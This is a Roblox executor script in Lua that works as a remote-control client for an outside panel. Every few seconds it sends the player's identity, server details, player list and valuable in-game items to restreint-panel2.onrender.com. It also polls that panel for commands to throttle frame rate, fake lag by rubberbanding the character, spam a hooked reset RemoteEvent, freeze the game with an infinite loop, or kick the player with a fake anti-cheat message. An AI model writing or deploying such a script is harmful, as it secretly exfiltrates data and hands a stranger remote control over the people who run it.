local BASE = "https://restreint-panel2.onrender.com/"
local KEY  = "xenooooo"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local genv = (getgenv and getgenv()) or _G or {}
local function resolveRequest()
    return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or genv.http_request or genv.request or (genv.syn and genv.syn.request)
end

local request = resolveRequest()
if not request then
    local deadline = tick() + 10
    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
end
if not request then return end

local LP = Players.LocalPlayer
if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end

local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"

local function gameName()
    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
    return info and info.Name or "Unknown Game"
end

local function avatarUrl()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
end

local function serverPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
    return t
end

local function collectBrainrots()
    local list = {}
    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
    if not pg then return list end
    
    local possibleGUIs = {
        "DuelsMachineSession",
        "DuelsMachine",
        "BrainrotUI",
        "BrainrotSession",
        "SessionGUI",
        "DuelsGUI"
    }
    
    local gui = nil
    for _, name in ipairs(possibleGUIs) do
        gui = safe(function() return pg:FindFirstChild(name) end)
        if gui then break end
    end
    if not gui then return list end
    
    local targetFrame = nil
    local function findFrame(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and (child.Name == "ScrollingFrame" or child.Name == "ListFrame" or child.Name == "ItemList" or child:FindFirstChild("Template")) then
                return child
            end
            local found = findFrame(child)
            if found then return found end
        end
        return nil
    end
    
    targetFrame = findFrame(gui)
    if not targetFrame then 
        targetFrame = safe(function() return gui:FindFirstChild("ScrollingFrame") end)
    end
    if not targetFrame then 
        for _, child in ipairs(gui:GetDescendants()) do
            if child:IsA("Frame") and #child:GetChildren() > 3 then
                targetFrame = child
                break
            end
        end
    end
    if not targetFrame then return list end
    
    local processedItems = {}
    local function processItem(item)
        if not item or not item:IsA("Instance") or processedItems[item] then return end
        processedItems[item] = true
        
        local title = nil
        local cash = nil
        
        for _, obj in ipairs(item:GetDescendants()) do
            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and obj.Text ~= "" then
                local text = obj.Text
                if not string.find(text, "Template") and not string.find(text, "Background") and not string.find(text, "Frame") and not string.find(text, "Scroll") and not string.find(text, "Title") and not string.find(text, "Label") then
                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
                        if not title or (#text > #title) then
                            title = text
                        end
                    end
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") or string.find(text, "Cash") or 
                       (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50) then
                        cash = text
                    end
                end
            end
        end
        
        if title or cash then
            if title and title ~= "" then
                title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if cash and cash ~= "" then
                cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if title and string.match(title, "^%d+$") and not cash then
                return
            end
            table.insert(list, { 
                title = title and title ~= "" and title or "Unknown Item", 
                cash = cash and cash ~= "" and cash or "0" 
            })
        end
    end
    
    local function processAll(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and #child:GetChildren() > 0 then
                local hasText = false
                for _, desc in ipairs(child:GetDescendants()) do
                    if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) and desc.Text and desc.Text ~= "" then
                        hasText = true
                        break
                    end
                end
                if hasText then
                    processItem(child)
                end
            end
            if child:IsA("Frame") or child:IsA("ScrollingFrame") then
                processAll(child)
            end
        end
    end
    
    processAll(targetFrame)
    
    for _, child in ipairs(targetFrame:GetChildren()) do
        if child.Name == "Template" and child:IsA("Frame") then
            processItem(child)
        end
    end
    
    if #list == 0 then
        local simpleBrainrots = {}
        local seenTexts = {}
        for _, child in ipairs(pg:GetDescendants()) do
            if (child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox")) and child.Text and child.Text ~= "" then
                local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
                    seenTexts[text] = true
                    local cash = "0"
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
                        cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
                        text = text:gsub("[%$%d]+", ""):gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if text == "" then text = "Item" end
                    end
                    if #text > 1 then
                        table.insert(simpleBrainrots, { title = text, cash = cash })
                    end
                end
            end
        end
        if #simpleBrainrots > 0 then
            return simpleBrainrots
        end
    end
    
    return list
end

local function heartbeat()
    safe(function()
        local brainrots = collectBrainrots()
        local success, result = pcall(function()
            return request({
                Url = BASE .. "/api/public/heartbeat",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                Body = HttpService:JSONEncode({
                    user_id = LP.UserId,
                    username = LP.Name,
                    display_name = LP.DisplayName,
                    avatar_url = avatarUrl(),
                    place_id = game.PlaceId,
                    game_name = gameName(),
                    job_id = game.JobId,
                    executor = executorName,
                    server_players = serverPlayers(),
                    brainrots = brainrots,
                }),
            })
        end)
        if not success then
            local simpleBrainrots = {}
            local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
            if pg then
                for _, child in ipairs(pg:GetDescendants()) do
                    if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
                        local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
                            table.insert(simpleBrainrots, { title = text, cash = "0" })
                        end
                    end
                end
            end
            if #simpleBrainrots > 0 then
                pcall(function()
                    request({
                        Url = BASE .. "/api/public/heartbeat",
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                        Body = HttpService:JSONEncode({
                            user_id = LP.UserId,
                            username = LP.Name,
                            display_name = LP.DisplayName,
                            avatar_url = avatarUrl(),
                            place_id = game.PlaceId,
                            game_name = gameName(),
                            job_id = game.JobId,
                            executor = executorName,
                            server_players = serverPlayers(),
                            brainrots = simpleBrainrots,
                        }),
                    })
                end)
            end
        end
    end)
end

local fpsConn = nil
local fpsOn = false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do end
        end)
    else
        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
    end
end

local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local NORMAL_SPEED_MIN = 35
local CARRY_SPEED_MIN = 17
local posHistory = {}
local isActive = false
local mode = nil
local intervalThread = nil

RunService.Heartbeat:Connect(function()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
    local cutoff = now - HISTORY_SIZE - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do
        table.remove(posHistory, 1)
    end
end)

local function currentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end

local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
    if mode == "carry" then return s >= CARRY_SPEED_MIN end
    return false
end

local function doRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    local horizVel = Vector3.new(vel.X, 0, vel.Z)
    if horizVel.Magnitude < 1 then return end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #posHistory do
        if posHistory[i].time >= targetTime then
            best = posHistory[i].cframe
            break
        end
    end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end

local function stopLoop()
    if intervalThread then
        pcall(task.cancel, intervalThread)
        intervalThread = nil
    end
end

local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while isActive do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end

local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then
        isActive = true
        startLoop()
    else
        isActive = false
        stopLoop()
    end
end

local kicked = false
local prevLagN = false
local prevLagC = false
local prevFps = false
local prevReset = false
local resetActive = false
local resetThread = nil

-- Insta reset (même logique que Filthy Hub) : RemoteEvent "RE/" + FireServer
local RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
local reset_remote = nil
local insta_reset_cooldown = false

local orig_fire
pcall(function()
    if hookfunction and newcclosure then
        orig_fire = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
            if not reset_remote and type(self.Name) == "string" and self.Name:sub(1, 3) == "RE/" then
                reset_remote = self
            end
            return orig_fire(self, ...)
        end))
    end
end)

task.spawn(function()
    task.wait(3)
    if reset_remote then return end
    for _, desc in ipairs(game:GetDescendants()) do
        if desc:IsA("RemoteEvent") and desc.Name:sub(1, 3) == "RE/" then
            reset_remote = desc
            break
        end
    end
end)

local function findResetRemote()
    if reset_remote and reset_remote.Parent then return reset_remote end
    reset_remote = nil
    for _, desc in ipairs(game:GetDescendants()) do
        if desc:IsA("RemoteEvent") and desc.Name:sub(1, 3) == "RE/" then
            reset_remote = desc
            break
        end
    end
    return reset_remote
end

local function insta_reset()
    if insta_reset_cooldown then return end
    if not findResetRemote() then return end

    local old_char = LP.Character
    if not old_char then return end

    insta_reset_cooldown = true
    task.spawn(function()
        while LP.Character == old_char do
            pcall(function()
                reset_remote:FireServer(RESET_GUID, LP, "balloon")
            end)
            task.wait()
        end
        insta_reset_cooldown = false
    end)
end

local function setReset(on)
    if on == resetActive then return end
    resetActive = on
    if resetThread then
        pcall(task.cancel, resetThread)
        resetThread = nil
    end
    if not on then
        insta_reset_cooldown = false
        return
    end

    resetThread = task.spawn(function()
        while resetActive do
            local char = LP.Character
            if not char then
                char = LP.CharacterAdded:Wait()
            end
            if not resetActive then break end

            if char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 3) then
                task.wait(0.05)
                if not resetActive then break end
                insta_reset()

                -- attendre que le perso change (insta reset OK), sinon retry
                local deadline = tick() + 5
                while resetActive and LP.Character == char and tick() < deadline do
                    if not insta_reset_cooldown then
                        insta_reset()
                    end
                    task.wait(0.05)
                end
            end

            if resetActive and LP.Character == char then
                LP.CharacterAdded:Wait()
            elseif resetActive then
                task.wait(0.05)
            end
        end
    end)
end

local function poll()
    local res = safe(function()
        return request({
            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
            Method = "GET",
            Headers = { ["X-Api-Key"] = KEY },
        })
    end)
    if not res or not res.Body then return end
    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok2 or type(data) ~= "table" then return end

    local wantFps = (data.fps_limit == true)
    if wantFps ~= prevFps then
        prevFps = wantFps
        setFpsLimit(wantFps)
    end

    local wantN = (data.lag_n == true)
    local wantC = (data.lag_c == true)
    if wantC ~= prevLagC or wantN ~= prevLagN then
        prevLagC = wantC
        prevLagN = wantN
        if wantC then
            setMode("carry")
        elseif wantN then
            setMode("normal")
        else
            setMode(nil)
        end
    end

    local wantReset = (data.reset == true)
    if wantReset ~= prevReset then
        prevReset = wantReset
        setReset(wantReset)
    end

    if data.crash == true then
        while true do end
    end
    if data.kick == true and not kicked then
        kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
end

-- Au lancement / rejoindre : force reset OFF (évite qu'il reste ON après une déco)
safe(function()
    request({
        Url = BASE .. "/api/public/command",
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
        Body = HttpService:JSONEncode({ user_id = LP.UserId, reset = false }),
    })
end)

heartbeat()
poll()

task.spawn(function()
    while task.wait(3) do heartbeat() end
end)

task.spawn(function()
    while task.wait(0.5) do poll() end
end)
